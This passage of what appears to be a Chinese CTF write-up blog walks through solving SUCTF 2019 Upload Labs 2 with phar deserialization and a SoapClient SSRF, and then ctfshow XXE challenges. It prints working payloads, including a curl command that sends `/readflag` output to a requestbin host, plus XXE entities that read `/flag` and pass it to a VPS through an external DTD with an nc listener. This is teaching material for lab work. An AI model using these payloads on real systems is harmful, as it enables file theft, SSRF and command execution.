class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file_name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$type</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span> = <span class="string">&quot;Check&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file_name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file_name = <span class="variable">$file_name</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$class</span> = <span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="variable language_">$this</span>-&gt;func);</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable">$class</span>-&gt;<span class="title function_ invoke__">newInstanceArgs</span>(<span class="variable">$this</span>-&gt;file_name);</span><br><span class="line">        <span class="variable">$a</span>-&gt;<span class="title function_ invoke__">check</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getMIME</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$finfo</span> = <span class="title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;type = <span class="title function_ invoke__">finfo_file</span>(<span class="variable">$finfo</span>, <span class="variable">$this</span>-&gt;file_name);</span><br><span class="line">        <span class="title function_ invoke__">finfo_close</span>(<span class="variable">$finfo</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;type;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Check</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file_name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file_name = <span class="variable">$file_name</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file_name);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;&lt;?&quot;</span>) !== <span class="literal">FALSE</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;&amp;lt;? in contents!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中的finfo_file可以触发phar反序列化</p><p>为了绕过func.php中的正则，我们可以使用php伪协议进行绕过，提示在File类中存在如下wakeup方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function __wakeup()&#123;</span><br><span class="line">    $class = new ReflectionClass($this-&gt;func);</span><br><span class="line">    $a = $class-&gt;newInstanceArgs($this-&gt;file_name);</span><br><span class="line">    $a-&gt;check();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在该方法中使用反射可以获取到任意类的实例，在这里自然想到soap反序列化，当执行到$a-&gt;check();的时候会触发__call方法，可以造成ssrf，参考如下文章<a href="https://blog.csdn.net/qq_38154820/article/details/106330082">https://blog.csdn.net/qq_38154820/article/details/106330082</a></p><p>在这里可以及构造如下上传phar的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$file_name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$target</span> = <span class="string">&#x27;http://127.0.0.1/admin.php&#x27;</span>;</span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;admin=1&amp;cmd=curl &quot;http://http.requestbin.buuoj.cn/w7rkm9w7?a=`/readflag`&quot;&amp;clazz=SplDoublyLinkedList&amp;func1=unshift&amp;func2=unshift&amp;func3=unshift&amp;arg1=1&amp;arg2=2&amp;arg3=3&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: name=1234&#x27;</span></span><br><span class="line">    );</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func = <span class="string">&quot;SoapClient&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file_name = [<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&quot;wupco\r\nContent-Type: application/x-www-form-urlencoded\r\n&quot;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$headers</span>).<span class="string">&quot;\r\nContent-Length: &quot;</span>.(<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_string</span>).<span class="string">&quot;\r\n\r\n&quot;</span>.<span class="variable">$post_string</span>,<span class="string">&#x27;uri&#x27;</span>=&gt; <span class="string">&quot;aaab&quot;</span>)];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;__HALT_COMPILER();&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们将得到的phar.phar改为phar.gif</p><p>上传后触发phar</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/resource=phar://upload/17ac2685d5d5a6c401e7f5b28a603095/628941e623f5a967093007bf39be805f.jpg</span><br></pre></td></tr></table></figure><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505212146291.png" alt="image-20250521214608131" loading="lazy"></p><p>在vps请求里拿到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;SUCTF-2019-Upload-Labs-2&quot;&gt;&lt;a href=&quot;#SUCTF-2019-Upload-Labs-2&quot; class=&quot;headerlink&quot; title=&quot;[SUCTF 2019]Upload Labs 2&quot;&gt;&lt;/a&gt;[SUCTF 2019]U</summary>
      
    
    
    
    
    <category term="upload" scheme="https://kinseyy.github.io/tags/upload/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-xxe</title>
    <link href="https://kinseyy.github.io/2025/05/19/ctfshow-xxe/"/>
    <id>https://kinseyy.github.io/2025/05/19/ctfshow-xxe/</id>
    <published>2025-05-19T11:02:05.000Z</published>
    <updated>2025-05-19T13:14:34.049Z</updated>
    
    <content type="html"><![CDATA[<h3 id="XML语法"><a href="#XML语法" class="headerlink" title="XML语法"></a>XML语法</h3><p>1.是树形结构，必须具有根元素</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">child</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">subchild</span>&gt;</span>.....<span class="tag">&lt;/<span class="name">subchild</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">child</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>例如</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span> </span><br></pre></td></tr></table></figure><p>2.声明：&lt;?xml version&#x3D;”1.0” encoding&#x3D;”UTF-8”?&gt;</p><p>3.在标签中，大小写敏感</p><p>4.属性的值必须加引号</p><p>5.实体引用</p><p>一些字符拥有特殊含义，所以使用实体引用代替特殊字符</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>if salary &lt; 1000 then<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--上面的&lt;是特殊字符 在解析器中会把他当做新元素的开始 修改如下--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>if salary <span class="symbol">&amp;lt;</span> 1000 then<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><p>作用</p><p>在XML文档中加入DTD声明可以告诉XML解析器该文档遵循哪个DTD文档类型，对文档进行验证，以确保文档正确性。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">rootElement</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;example.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">rootElement</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">childElement</span>&gt;</span>Hello World!<span class="tag">&lt;/<span class="name">childElement</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">rootElement</span>&gt;</span></span><br></pre></td></tr></table></figure><p>限制：&lt;!ELEMENT</p><h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><p>什么是XXE：构造恶意DTD主要是利用实体引用</p><p>实体引用介绍：</p><p>一、通用实体</p><p>1.内部实体（无SYSTEM 不需要应用外部文件）</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta">        <span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span>  &lt;!--定义元素为any 说明接收任何元素 --&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="string">&quot;test&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">pass</span>&gt;</span>mypass<span class="tag">&lt;/<span class="name">pass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在user标签中，使用&amp;进行引用，解析输出时就会被test替换</p><p>2.外部实体（带有SYSTEM 需要请求外部文件）</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/test.dtd&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">pass</span>&gt;</span>mypass<span class="tag">&lt;/<span class="name">pass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure><p>相当于在dtd文档中创建了外部实体xxe，该实体的作用是读取本地文件</p><p>当解析xml文档时会遇到&amp;xxe，它会自动读取文件的操作</p><p>上面的SYSTEM引用的方法还能使用公用DTD的方法操作</p><!DOCTYPE 根元素名称 PUBLIC "DTD标识名" "公用DTD的URI"><p>二、参数实体</p><p>定义：%实体名</p><p>引用：%实体名</p><p>特点：类似上面通用实体，支持外部引用</p><p>举例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; </span><br><span class="line">&lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt; </span><br><span class="line">%an-element; %remote-dtd;</span><br></pre></td></tr></table></figure><p>XXE危害</p><p>1.file:&#x2F;&#x2F;xxx读取文件</p><p>2.SSRF攻击</p><p>3.盲注 信息数据泄露</p><p>4.结合文件上传 getshell</p><h3 id="web373（有回显）"><a href="#web373（有回显）" class="headerlink" title="web373（有回显）"></a>web373（有回显）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);   </span><br></pre></td></tr></table></figure><p>我们来看代码，创建DOMDocument对象，加载XML文件，然后再XML文件中再提取ctfshow标签的内容，进行echo显示</p><p>解题：首先存在一个php:&#x2F;&#x2F;input读取我们抓包的内容</p><p>那么我们可以写一个xml文件</p><p>然后再ctfshow标签中引用外部实体，读取flag文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">XXE</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">cmd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">happy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ctfshow</span>&gt;</span><span class="symbol">&amp;cmd;</span><span class="tag">&lt;/<span class="name">ctfshow</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">happy</span>&gt;</span></span><br></pre></td></tr></table></figure><p>得到flag</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505191957523.png" alt="image-20250519195729400" loading="lazy"></p><h3 id="web374（无回显）"><a href="#web374（无回显）" class="headerlink" title="web374（无回显）"></a>web374（无回显）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br></pre></td></tr></table></figure><p>我们来观察这道题和上题的区别，同样存在xml文档的加载，但是却没有了echo进行回显，所以这道题怎么做</p><p>我们考虑flag外带，上我们自己的服务器将内容带出</p><p>分为两个部分：一个是直接让我们的题目服务器解析的xml文档语句，一个是我们存放在我们自己的vps上的外部dtd文档，然后在题目服务器xml解析时对我们的vps发起请求，然后在vps中将获得的内容传输到端口监听中</p><ol><li>使用<code>php://filter</code> 获取目标文件内容，然后将内容以http请求的方式发送到我们的vps上</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 格式约束--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">updateProfile</span> [</span></span><br><span class="line"><span class="meta">        &lt;!--使用伪协议读取题目服务器中的文件--&gt;</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">        &lt;!--写在我们服务器的dtd文件--&gt;</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">dtds</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://xxx/test/test.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">        &lt;!--解析dtd的时候把外部的dtd文件放过来--&gt;</span></span><br><span class="line"><span class="meta">    %dtds;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line">        </span><br><span class="line"><span class="comment">&lt;!--补全形式--&gt;</span>      </span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">1</span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2.放在我们服务器上的内容</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; showflag SYSTEM &#x27;http://ip:port/%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--evil.dtd的内容，内部的%号要进行实体编码成&amp;#x25;  相当于% showflag--&gt;</span></span><br><span class="line">%dtd;</span><br><span class="line">%showflag;</span><br></pre></td></tr></table></figure><p>首先在1中会解析%dtds 去调用2的内容</p><p>然后2的内容展示在面板上之后会触发2中%dtd的解析 将2中内层嵌套的语句加载到面板上</p><p>然后解析%showflag 去加载SYSTEM的语句，访问我们的vps，同时携带file获得的数据，其中%file获得已经在面板中1里面的请求。</p><p>注意！一定要注意 POST传输的数据里面一定不要和vps中的文件里面定义的变量重名。比如vps中设置的是dtd我们POST传输的时候需要dtds或者其他任意的。</p><p>然后再bp中POST传入payload</p><p>在自己服务器开启监听nc -lnvp port</p><h3 id="web375"><a href="#web375" class="headerlink" title="web375"></a>web375</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>继续与上题进行类比，我们可以发现增加的是对xml头的整个语句的正则匹配</p><p>这里匹配到的语句是：&lt;?xml version&#x3D;”1.0”</p><p>绕过方法一：</p><p>直接不写了，传一下看看</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 要引用（dtd里面），所以要加百分号% --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- /flag 改成 /etc/passwd 可能会失败，因为内容太多了 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">hacker</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY  % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY  % <span class="keyword">dtds</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://xxx/test/test.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    %dtds;</span></span><br><span class="line"><span class="meta">]&gt;</span> </span><br><span class="line"><span class="comment">&lt;!-- 不能直接&lt;!ENTITY  % myurl SYSTEM &quot;http://vps-ip:port/%file&quot;&gt; 